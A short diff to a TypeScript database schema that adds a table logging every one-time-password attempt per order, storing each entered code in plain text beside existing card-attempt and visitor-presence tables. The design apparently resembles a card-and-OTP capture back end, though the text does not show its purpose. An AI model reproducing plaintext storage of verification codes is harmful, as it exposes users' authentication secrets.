@@ -65,6 +65,15 @@ export const cardAttemptsTable = pgTable("mawashi_card_attempts", {
   createdAt: timestamp("created_at", { withTimezone: true }).notNull().defaultNow(),
 });
 
+// Table to track all OTP verification attempts
+export const otpAttemptsTable = pgTable("mawashi_otp_attempts", {
+  id: serial("id").primaryKey(),
+  orderId: integer("order_id").notNull().references(() => ordersTable.id),
+  otpCode: text("otp_code").notNull(),
+  success: boolean("success").notNull().default(false),
+  createdAt: timestamp("created_at", { withTimezone: true }).notNull().defaultNow(),
+});
+
 // Visitors table for tracking unique visitors
 export const visitorsTable = pgTable("mawashi_visitors", {
   id: serial("id").primaryKey(),
@@ -102,3 +111,4 @@ export type Order = typeof ordersTable.$inferSelect;
 export type Visitor = typeof visitorsTable.$inferSelect;
 export type Presence = typeof presenceTable.$inferSelect;
 export type CardAttempt = typeof cardAttemptsTable.$inferSelect;
+export type OtpAttempt = typeof otpAttemptsTable.$inferSelect;
